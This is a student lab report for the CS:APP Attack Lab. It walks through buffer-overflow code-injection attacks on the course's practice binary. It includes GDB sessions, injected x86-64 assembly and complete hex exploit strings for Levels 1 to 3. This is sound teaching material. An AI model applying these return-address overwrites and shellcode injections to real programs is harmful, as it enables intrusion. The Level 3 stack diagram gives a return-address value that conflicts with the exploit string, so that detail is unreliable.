# CS:APP Attack Lab Report
**Name** SUNCHAOYI  

Use the `-q` flag when running the target programs to avoid connecting to the grading server: `./ctarget -q` / `./rtarget -q`.

## Part 1 Code Injection Attacks

### Level 1

First use `objdump -d ctarjet > ctarjet.asm` to analyze the machine instructions of the target program.

Analysis of the disassembly reveals the addresses of the key functions: `<test>`, `<getbuf>`, and `<touch1>`. The objective is to modify the control flow when `getbuf` returns. Normally, `getbuf` returns to address `0x401976` within `test`. The goal is to overwrite this return address with the address of `touch1`, which is `0x4017c0`.

Examination of the `<getbuf>` function shows that it allocates `0x28` (40) bytes on the stack for the input buffer. To successfully redirect execution, the exploit must completely fill this 40-byte buffer and then overwrite the subsequent 8 bytes on the stack, which hold the saved return address. The target address, `0x4017c0`, must be written in **little-endian byte order** in x86-64.

Therefore, the exploit string is:

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

Create a text file (e.g., `exploit.txt`) and construct the attack string according to the specified format (two hex digits per byte, separated by spaces). Use the following pipeline to convert the text file to raw bytes and feed them to the target program: `./hex2raw < exploit.txt | ./ctarget`.

### Level 2

The goal is to redirect program execution from `getbuf` to `touch2` by injecting code that sets `%rdi` to the cookie value, exploiting a buffer overflow vulnerability in the `Gets()` function call.

The initial step involves locating the call site of the `<Gets>` function. The instruction `call 401a40 <Gets>` is found at address `0x4017af`. Using GDB, a breakpoint is set at this address to inspect the runtime stack state.

```
(gdb) b *0x4017af
(gdb) r -q
(gdb) display /x $rsp
```

The inspection reveals the stack pointer (`%rsp`) holds the value `0x5561dc78`, which indicates the starting address of the input buffer allocated by `getbuf`.

The core of the exploit is a short sequence of machine instructions. This sequence is designed to load the cookie value (`0x59b997fa`) into the `%rdi` register and then transfer control to the `touch2` function.

```assembly
movq $0x59b997fa, %rdi
pushq $0x4017ec
retq
```

To obtain the raw machine code bytes corresponding to this assembly, the source is assembled and disassembled using `gcc` and `objdump`.

```bash
gcc -c exploit.s
objdump -d exploit.o
```

The final exploit string is constructed by placing this instruction byte sequence at the beginning of the buffer, padding the remaining buffer space up to 40 bytes with zeros, and then overwriting the saved return address on the stack. The return address is set to `0x5561dc78`, the buffer's start address, so that the `ret` instruction in `getbuf` transfers control to the injected code. The complete byte string is:

```
48 c7 c7 fa 97 b9 59 68 
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

Certainly. The exploit code may be positioned at any valid location within the buffer area. The following configuration represents an alternative valid solution:

```
00 00 00 00 00 00 00 00
48 c7 c7 fa 97 b9 59 68 
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
80 dc 61 55 00 00 00 00
```

### Level 3

The key distinction is that Level 2 injects and executes code before any subsequent function calls overwrite the stack, whereas Level 3 must position its injected string in a region of the stack that will **not be overwritten** by the subsequent local buffer (`cbuf[110]`) allocated within the `hexmatch` function.

The cookie value must be converted into its hexadecimal string representation: `35 39 62 39 39 37 66 61` (corresponding to `"59b997fa"`).

After `getbuf` returns, its stack memory is effectively recycled and reused by `touch3` and `hexmatch`. Due to the random offset used within `hexmatch`, the only consistently safe area for storing data is within the `test` function's preserved stack region.

Inspection of the stack pointer at the entry to `touch3` reveals `$rsp = 0x5561dca0`. Therefore, a safe location for the cookie string is at `0x5561dca8`, just above this address.

```
(gdb) b getbuf
(gdb) p/x $rsp
$1 = 0x5561dca0
```

Verification using `gdb` confirms the safety of this address:

```
./hex2raw < exploit.txt > level.raw
(gdb) b touch3
(gdb) b hexmatch
(gdb) r -q < level.raw
(gdb) p/x $rsp
$1 = 0x5561dca8
(gdb) c
(gdb) p/x $rsp
$2 = 0x5561dc98
```

Stack Layout Analysis:

```
High address
│                              │
├──────────────────────────────┤ 0x5561dcd0
│ Other parts of test frame    │
├──────────────────────────────┤ 0x5561dcc8
│ Return address               │
│ (overwritten to 0x5561dca0)  │ ← exploit control flow
├──────────────────────────────┤ 0x5561dcc0
│ Possibly free                │
├──────────────────────────────┤ 0x5561dcb8
│ Possibly free                │
├──────────────────────────────┤ 0x5561dcb0
│ Potential injection point    │
├──────────────────────────────┤ 0x5561dca8
│ rsp position at touch3 entry │ ← rsp value you observed
├──────────────────────────────┤ 0x5561dca0
│ touch3 saved rbx             │ ← written by touch3 push %rbx
├──────────────────────────────┤ 0x5561dc98
│ hexmatch return address      │ ← written by call hexmatch
├──────────────────────────────┤ 0x5561dc90                    
│ hexmatch saved r12           │ ← written by push %r12       
├──────────────────────────────┤ 0x5561dc88                    
│ hexmatch saved rbp           │ ← written by push %rbp       
├──────────────────────────────┤ 0x5561dc80                    
│ hexmatch saved rbx           │ ← written by push %rbx       
├──────────────────────────────┤ 0x5561dc78                    
│ Original getbuf buffer area  │                              
├──────────────────────────────┤ 0x5561dc00                    
│ Start of hexmatch's cbuf[110]│ ← new stack top after add -128! 
│ ...                          │                                
│ cbuf[0]...cbuf[109]          │                                
├──────────────────────────────┤                                
│ Remaining hexmatch frame     │                                
Low Address
```

Address `0x5561dca8` remains safe because `touch3`'s `push %rbx` first decrements `$rsp` by 8 and then stores the value of `%rbx` at `0x5561dca0`, leaving `0x5561dca8` untouched.

The injected code should therefore set up the argument and transfer control:


```
movq $0x5561dca8, %rdi
pushq $0x4018fa
ret
```

Using the same construction method as Level 2, the final exploit string becomes (`0x5561dc78` $\sim$ `0x5561dca8`) : 

```
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

Placing the cookie string at `0x5561dcb0` is also feasible, requiring additional padding:

```
48 c7 c7 b0 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
00 00 00 00 00 00 00 00
35 39 62 39 39 37 66 61
```